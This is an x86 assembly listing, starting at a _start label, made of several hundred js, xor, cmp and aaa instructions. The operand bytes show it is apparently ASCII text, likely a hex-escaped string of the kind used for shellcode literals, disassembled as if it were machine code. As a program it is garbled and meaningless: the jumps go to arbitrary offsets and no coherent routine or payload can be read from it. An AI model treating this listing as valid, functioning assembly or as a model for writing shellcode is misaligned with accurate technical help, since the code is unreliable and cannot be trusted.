global _start
_start:
js 0x35
xor [eax+0x43],edi
xor [eax+0x35],bh
xor [eax+0x36],bh
cmp [eax+0x37],bh
xor [eax+0x37],edi
xor [eax+0x37],edi
cmp [eax+0x37],edi
xor edi,[eax+0x36]
cmp [eax+0x37],bh
xor al,0x78
xor dh,[eax]
js 0x5a
xor eax,0x78383778
cmp [ss:eax+0x37],bh
xor al,0x78
aaa
xor al,0x78
aaa
ss js 0x67
xor edi,[eax+0x36]
cmp [eax+0x32],bh
xor eax,0x78353778
xor dh,[edi]
js 0x76
xor eax,0x78383678
xor dh,[eax]
js 0x7f
xor [eax+0x37],bh
cmp [eax+0x37],edi
xor bh,[eax+0x36]
cmp [eax+0x32],bh
xor eax,0x78363778
aaa
xor edi,[eax+0x32]
xor [eax+0x36],bh
cmp [eax+0x32],bh
xor al,0x78
xor dh,[eax+edi*2]
aaa
ss js 0xa8
xor [eax+0x36],bh
cmp [eax+0x32],bh
xor bh,[eax+0x37]
xor bh,[eax+0x37]
cmp [eax+0x37],edi
xor al,0x78
cmp [ss:eax+0x37],bh
xor [eax+0x37],edi
xor [eax+0x37],edi
cmp [eax+0x32],bh
aaa
js 0xc8
cmp [eax+0x32],bh
xor al,0x78
xor dh,[eax]
js 0xd2
xor [eax+0x32],bh
xor edi,[eax+0x36]
cmp [eax+0x32],bh
xor al,0x78
xor dh,[edx]
js 0xdc
aaa
js 0xe4
cmp [eax+0x36],bh
cmp [eax+0x32],bh
xor al,0x78
aaa
xor eax,0x78343778
xor dh,[edx]
js 0xf5
cmp [eax+0x32],bh
xor al,0x78
aaa
xor edi,[eax+0x37]
xor bh,[eax+0x37]
ss js 0x104
cmp [eax+0x37],bh
xor eax,0x78373778
xor dh,[edx]
js 0x111
cmp [eax+0x36],bh
cmp [eax+0x37],bh
xor al,0x78
aaa
xor al,0x78
aaa
cmp [eax+0x37],bh
aaa
js 0x122
cmp [eax+0x37],bh
xor al,0x78
aaa
cmp [eax+0x37],bh
xor edi,[eax+0x32]
xor edi,[eax+0x36]
cmp [eax+0x37],bh
cmp [eax+0x37],edi
xor al,0x78
aaa
cmp [eax+0x37],edi
xor [eax+0x36],bh
cmp [eax+0x37],bh
xor [eax+0x32],edi
xor [eax+0x37],bh
xor [eax+0x37],bh
xor eax,0x78383678
aaa
cmp [eax+0x32],edi
xor eax,0x78343778
aaa
cmp [eax+0x36],edi
cmp [eax+0x37],bh
xor al,0x78
xor dh,[ebx]
js 0x163
aaa
js 0x16b
xor [eax+0x36],bh
cmp [eax+0x32],bh
xor al,0x78
xor dh,[edx]
js 0x172
xor eax,0x78303778
cmp [ss:eax+0x37],bh
ss js 0x183
xor bh,[eax+0x32]
xor eax,0x78343278
cmp [ss:eax+0x37],bh
xor [eax+0x37],edi
xor [eax+0x37],bh
xor bh,[eax+0x32]
xor bh,[eax+0x36]
cmp [eax+0x37],bh
xor [eax+0x37],bh
aaa
js 0x1a4
xor bh,[eax+0x32]
xor [eax+0x36],bh
cmp [eax+0x32],bh
xor [eax+0x37],bh
xor bh,[eax+0x37]
xor bh,[eax+0x32]
xor [eax+0x36],bh
cmp [eax+0x37],bh
cmp [eax+0x32],bh
xor bh,[eax+0x37]
xor bh,[eax+0x37]
cmp [eax+0x36],edi
cmp [eax+0x37],bh
ss js 0x1ce
ss js 0x1cc
xor al,0x78
aaa
xor [eax+0x36],bh
cmp [eax+0x37],bh
cmp [eax+0x32],bh
aaa
js 0x1e0
xor [eax+0x37],edi
xor [eax+0x36],edi
cmp [eax+0x37],bh
ss js 0x1ec
aaa
js 0x1ef
cmp [eax+0x37],bh
xor bh,[eax+0x36]
cmp [eax+0x37],bh
xor bh,[eax+0x32]
xor [eax+0x37],bh
xor bh,[eax+0x37]
cmp [eax+0x36],bh
cmp [eax+0x37],bh
xor eax,0x78313778
aaa
xor edi,[eax+0x32]
xor bh,[eax+0x36]
cmp [eax+0x32],bh
aaa
js 0x219
cmp [eax+0x37],bh
xor al,0x78
xor dh,[dword 0x78343578]
xor eax,0x42387845
js 0x23a
inc ebp
js 0x22f
inc edx
js 0x23e
aaa
js 0x243
inc ebx
js 0x242
cmp [eax+0x38],edi
xor [eax+0x30],bh
xor [eax+0x30],bh
xor [eax+0x30],bh
xor [eax+0x42],bh
inc edx
js 0x246
xor [eax+0x30],edi
xor [eax+0x30],bh
xor [eax+0x30],bh
xor [eax+0x33],bh
xor [eax+0x43],edi
xor [eax+0x35],bh
xor [eax+0x41],bh
inc ebx
js 0x25d
xor edi,[eax+0x43]
xor edi,[eax+0x41]
inc ecx
js 0x278
xor bh,[eax+0x46]
inc ecx
js 0x26e
xor al,0x78
xor eax,0x43437845